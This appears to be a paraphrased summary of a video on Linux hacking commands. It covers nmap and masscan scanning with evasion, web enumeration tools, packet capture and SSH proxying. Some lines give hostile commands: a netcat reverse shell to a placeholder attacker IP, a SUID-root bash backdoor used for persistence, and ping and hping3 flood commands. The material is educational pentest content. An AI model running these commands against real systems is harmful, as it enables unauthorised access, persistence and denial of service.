## Key claims (dated 2024-04-03 unless noted; all paraphrase)

**Host discovery / connectivity (Chuck):**
- `ping` checks whether a host is up before attacking; `-s` sets packet size to test
  firewall handling, and `-f` floods the host with packets. `iftop` (`apt install iftop`)
  is offered as a bonus tool to visualize the flood traffic live.
- `hping3` (`apt install hping3`) is a richer ping/packet-crafting tool: flood a specific
  TCP port (`-S -p 80 --flood -V`), do custom traceroutes (TCP `-p 80 -S`, UDP with a
  destination port, set the ACK flag with `-A`, change base port with `--baseport`) â€” all
  useful for evading firewall rules.
- `ptunnel` (`apt install ptunnel`) tunnels TCP (e.g. SSH) over ICMP echo request/reply to
  evade firewalls; run bare on the target, and with `-p/-lp/-da/-dp` on the attacker.

**Scanning (Chuck):**
- `nmap` (`apt install nmap`) discovers and enumerates hosts: `-sn` ping-sweeps a network,
  `-sV` does service/version discovery, `-O` does OS detection, `-Pn` skips the ping probe,
  `-sL` does hostname listing. NSE scripts (`--script vuln`, `--script malware`) scan for
  vulnerabilities/malware; `-A` does aggressive all-in-one (OS + version + scripts +
  traceroute). Evasion: `-f` fragments packets, `--source-port` spoofs a source port
  (e.g. pose as DNS), `-D RND:10` scans behind 10 random decoy IPs.
- `masscan` (`apt install masscan`) is like nmap but built for scanning huge ranges fast
  via `--rate`; `--randomize-hosts` reorders scanning to stay hidden; can quickly find
  insecure services like telnet on port 23 across a network.

**Web / service enumeration (Chuck):**
- `whois` (`apt install whois`) returns domain registration details.
- `whatweb` (`apt install whatweb`) fingerprints the technologies a website runs (e.g.
  detected Shopify on networkchuck.coffee).
- `nikto` (`apt install nikto`) is an open-source web-server vulnerability scanner (`-h host`).
- `gobuster` (`apt install gobuster`) brute-forces directories/files (`dir` mode, `-u`, `-w`
  wordlist) and enumerates subdomains (`dns` mode, `-d`, `-w`); fast because it's written in Go.
- `seclists` (`apt install seclists`) installs a large wordlist collection under
  `/usr/share/seclists`; `wget` can grab a single list (e.g. Jason Haddock's DNS list) from GitHub.
- `sublist3r` (`apt install sublist3r`, `-d domain`) enumerates subdomains.
- `wpscan` scans WordPress sites (`--url`, `--enumerate u/p/t`, aggressive plugin detection);
  needs a free API token (`--api-token`) for useful vuln output.
- `amass` (`apt install amass`) does subdomain enumeration â€” active (`enum -d`) or passive
  (`enum -passive -d`) depending on scope.
- `git` (`apt install git`) + `git clone` is used constantly to pull hacking tools from
  GitHub/GitLab; used here to install `searchsploit` (`searchsploit <term>`, `-u` to update
  the exploit database) for searching known exploits.

**Guest commands:**
- Tom Hudson (tomnomnom): pipe any command's output to `vim -` to edit it, re-run it
  through another command via `:%!` (e.g. `sort`, `grep -v`), and use `gf` to open a
  filename under the cursor in a new buffer.
- John Hammond (fun): `sl` (steam locomotive) is a joke command that plays a train
  animation when you fat-finger `ls`; `/dev/urandom` streams pseudorandom gibberish; you
  can alias `ls` to `cat /dev/urandom` as a prank.
- John Hammond (real hacking command â€” his favorite): create a SUID-root backdoor.
  `/bin/bash -p` preserves SUID permissions; `chmod +s /bin/bash` (as root) turns bash into
  a SUID binary, so afterward `bash -p` gives instant root â€” a persistence mechanism / foothold.
- NahamSec (curl): `curl -I` dumps response headers (e.g. spot a 302 redirect); great for
  probing API endpoints and passing custom auth headers instead of using a browser.

**Traffic capture (Chuck):**
- `tcpdump` (`apt install tcpdump`) captures packets: `-i any` / `-i eth0`, filter for
  `icmp`, `-w capture.pcap` to save, `-r` to read back, `-c` to limit packet count.
- `tshark` (`apt install tshark`), the command-line Wireshark, is far more powerful:
  verbose capture (`-V -c 1 -i eth0`), display filters (`-Y 'http.request.method == "GET"'`),
  timed capture with `timeout`, statistics (`-qz endpoints,ip`), follow TCP streams
  (`-qz follow,tcp,ascii,<n>`), and custom field output (`-T fields -e ip.src -e ip.dst`).

**Pivoting / access (Chuck):**
- `tmux` (`apt install tmux`) is a terminal multiplexer: `Ctrl-B D` detaches, `tmux a`
  reattaches, named sessions (`new -s`, `ls`, `a -t`), `Ctrl-B W` to switch â€” sessions
  survive across machines.
- `ssh` remotes into systems, runs a single remote command in quotes, and can act as a
  SOCKS proxy with `ssh -D 1337 -C -q -N root@server`, then launch Chromium through the
  SOCKS5 proxy to appear in another country (demo: Dallas â†’ Osaka, Japan).
- `netcat` (`apt install netcat-traditional`) is the go-to for reverse shells: listener
  `nc -lvp 1337` on the attacker, `nc -e /bin/sh <attacker-ip> 1337` on the target; also
  makes a quick two-way chat server.
